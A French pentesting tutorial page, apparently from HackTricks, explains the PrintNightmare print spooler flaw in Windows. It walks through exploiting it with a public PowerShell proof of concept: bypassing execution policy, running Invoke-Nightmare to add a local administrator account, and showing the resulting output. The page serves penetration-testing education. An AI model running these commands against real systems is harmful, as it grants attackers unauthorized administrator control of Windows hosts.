# PrintNightmare

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Cette page a été copiée depuis** [**https://academy.hackthebox.com/module/67/section/627**](https://academy.hackthebox.com/module/67/section/627)****

`CVE-2021-1675/CVE-2021-34527 PrintNightmare` est une faille dans [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) qui est utilisée pour permettre l'impression à distance et l'installation de pilotes. \
Cette fonction est destinée à donner aux **utilisateurs ayant le privilège Windows `SeLoadDriverPrivilege`** la possibilité d'**ajouter des pilotes** à un spouleur d'impression distant. Ce droit est généralement réservé aux utilisateurs du groupe Administrateurs intégrés et des Opérateurs d'impression qui peuvent avoir besoin d'installer un pilote d'imprimante sur la machine d'un utilisateur final à distance.

La faille a permis à **n'importe quel utilisateur authentifié d'ajouter un pilote d'impression** à un système Windows sans avoir le privilège mentionné ci-dessus, permettant à un attaquant une **exécution de code à distance complète en tant que SYSTEM** sur tout système affecté. La faille **affecte toutes les versions prises en charge de Windows**, et étant donné que le **spouleur d'impression** s'exécute par défaut sur les **contrôleurs de domaine**, Windows 7 et 10, et est souvent activé sur les serveurs Windows, cela présente une énorme surface d'attaque, d'où le nom "nightmare".

Microsoft a initialement publié un correctif qui n'a pas résolu le problème (et les premières directives étaient de désactiver le service Spooler, ce qui n'est pas pratique pour de nombreuses organisations), mais a publié un deuxième [correctif](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) en juillet 2021 avec des directives pour vérifier que des paramètres de registre spécifiques sont définis sur `0` ou non définis.&#x20;

Une fois que cette vulnérabilité a été rendue publique, des exploits PoC ont été rapidement publiés. Cette **version** [**ici**](https://github.com/cube0x0/CVE-2021-1675) de [@cube0x0](https://twitter.com/cube0x0) peut être utilisée pour **exécuter une DLL malveillante** à distance ou localement en utilisant une version modifiée d'Impacket. Le repo contient également une **implémentation en C#**.\
Cette **implémentation PowerShell** [**ici**](https://github.com/calebstewart/CVE-2021-1675) peut être utilisée pour une élévation rapide des privilèges locaux. Par **défaut**, ce script **ajoute un nouvel utilisateur administrateur local**, mais nous pouvons également fournir une DLL personnalisée pour obtenir un shell inversé ou similaire si l'ajout d'un utilisateur administrateur local n'est pas dans le cadre. 

### **Vérification du service Spooler**

Nous pouvons rapidement vérifier si le service Spooler est en cours d'exécution avec la commande suivante. Si ce n'est pas le cas, nous recevrons une erreur "le chemin n'existe pas".
```
PS C:\htb> ls \\localhost\pipe\spoolss


    Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```
### **Ajout d'un administrateur local avec le PoC PowerShell PrintNightmare**

Commencez d'abord par [contourner](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) la politique d'exécution sur l'hôte cible :
```
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```
Maintenant, nous pouvons importer le script PowerShell et l'utiliser pour ajouter un nouvel utilisateur administrateur local.
```powershell
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
```
### **Confirmation du nouvel utilisateur administrateur**

Si tout s'est déroulé comme prévu, nous aurons un nouvel utilisateur administrateur local sous notre contrôle. Ajouter un utilisateur est "bruyant", nous ne voudrions pas le faire lors d'une mission où la discrétion est importante. De plus, nous voudrions vérifier avec notre client que la création de compte est dans le cadre de l'évaluation.
```
PS C:\htb> net user hacker

User name                    hacker
Full Name                    hacker
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?8/?9/?2021 12:12:01 PM
Password expires             Never
Password changeable          ?8/?9/?2021 12:12:01 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
